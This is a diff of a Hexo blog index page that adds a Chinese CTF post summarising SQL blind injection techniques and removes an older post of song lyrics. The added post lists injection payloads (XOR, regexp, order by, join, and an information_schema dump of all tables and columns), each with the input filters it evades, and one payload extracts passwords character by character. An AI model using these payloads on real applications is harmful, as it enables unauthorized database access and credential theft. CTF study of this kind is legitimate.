@@ -317,6 +317,226 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/sql盲注总结/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/sql盲注总结/index.html" itemprop="url">
+                  sql盲注总结[长期更新]
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-06 17:59:28" itemprop="dateCreated datePublished" datetime="2018-10-06T17:59:28+08:00">2018-10-06</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="XOR注入"><a href="#XOR注入" class="headerlink" title="XOR注入"></a>XOR注入</h3><ul>
+<li><p>基本payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23</span><br><span class="line">或者</span><br><span class="line">admin^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>ascii函数默认取字符串中第一个字符的ascii码作为输出  </p>
+</blockquote>
+</li>
+<li><p>使用场景</p>
+<ul>
+<li>过滤了关键字:<code>and</code> <code>or</code></li>
+<li>过滤了逗号</li>
+<li>过滤了空格</li>
+</ul>
+</li>
+</ul>
+<h3 id="regexp注入"><a href="#regexp注入" class="headerlink" title="regexp注入"></a>regexp注入</h3><ul>
+<li><p>基本payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select xxxx) regexp &apos;正则&apos;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用场景</p>
+<ul>
+<li>过滤了<code>=</code>，<code>in</code>,<code>like</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><ul>
+<li><p>基本payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id=&apos;1&apos; union select 1,2,&apos;a&apos;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用场景</p>
+<ul>
+<li>过滤了列名</li>
+<li>过滤了括号</li>
+<li>适用于已知该表的列名以及列名位置的注入</li>
+</ul>
+</li>
+</ul>
+<h3 id="join注入"><a href="#join注入" class="headerlink" title="join注入"></a>join注入</h3><ul>
+<li><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select * from(select 1)a join (select 2)b %23</span><br><span class="line">union all</span><br><span class="line">select * from(</span><br><span class="line">    (select 1)a join(</span><br><span class="line">        select F.[需要查询的字段号] from(</span><br><span class="line">            select * from [需要查询的表有多少个字段就join多少个]</span><br><span class="line">            union</span><br><span class="line">            select * from [需要查询的表] [limit子句]</span><br><span class="line">        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</span><br><span class="line">    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用场景：</p>
+<ul>
+<li>过滤了逗号、字段名</li>
+</ul>
+</li>
+</ul>
+<h3 id="Other-tips"><a href="#Other-tips" class="headerlink" title="Other tips"></a>Other tips</h3><ul>
+<li><p>一次性爆所有表名和字段名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> (@) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(@:=<span class="number">0x00</span>),(<span class="keyword">SELECT</span> (@) <span class="keyword">FROM</span> (information_schema.columns) <span class="keyword">WHERE</span> (table_schema&gt;=@) <span class="keyword">AND</span> (@)<span class="keyword">IN</span> (@:=<span class="keyword">CONCAT</span>(@,<span class="number">0x0a</span>,<span class="string">' [ '</span>,table_schema,<span class="string">' ] &gt;'</span>,table_name,<span class="string">' &gt; '</span>,column_name))))x)</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/编译原理——第一课-绪论-笔记/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2144,176 +2364,6 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/wmj-2/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/wmj-2/index.html" itemprop="url">
-                  纸短情长
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-05-21 23:55:35" itemprop="dateCreated datePublished" datetime="2018-05-21T23:55:35+08:00">2018-05-21</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>你陪我步入蝉夏<br>越过城市喧嚣<br>歌声还在游走<br>你榴花般的双眸<br>不见你的温柔<br>丢失花间欢笑<br>岁月无法停留<br>流云的等候<br>我真的好想你<br>在每一个雨季<br>你选择遗忘的<br>是我最不舍的<br>纸短情长啊<br>道不尽太多涟漪<br>我的故事都是关于你呀<br>怎么会爱上了她<br>并决定跟她回家<br>放弃了我的所有我的一切无所谓<br>纸短情长啊<br>诉不完当时年少<br>我的故事还是关于你呀<br>你陪我步入蝉夏<br>越过城市喧嚣<br>歌声还在游走<br>你榴花般的双眸<br>不见你的温柔<br>丢失花间欢笑<br>岁月无法停留<br>流云的等候<br>我真的好想你<br>在每一个雨季<br>你选择遗忘的<br>是我最不舍的<br>纸短情长啊<br>道不尽太多涟漪<br>我的故事都是关于你呀<br>怎么会爱上了她<br>并决定跟她回家<br>放弃了我的所有我的一切无所谓<br>纸短情长啊<br>诉不完当时年少<br>我的故事还是关于你呀<br>我真的好想你<br>在每一个雨季<br>你选择遗忘的<br>是我最不舍的<br>纸短情长啊<br>道不尽太多涟漪<br>我的故事都是关于你呀<br>怎么会爱上了她<br>并决定跟她回家<br>放弃了我的所有我的一切无所谓<br>纸短情长啊<br>诉不完当时年少<br>我的故事还是关于你呀<br>我的故事还是关于你呀</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2363,7 +2413,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">52</span>
+                    <span class="site-state-item-count">53</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2402,7 +2452,11 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
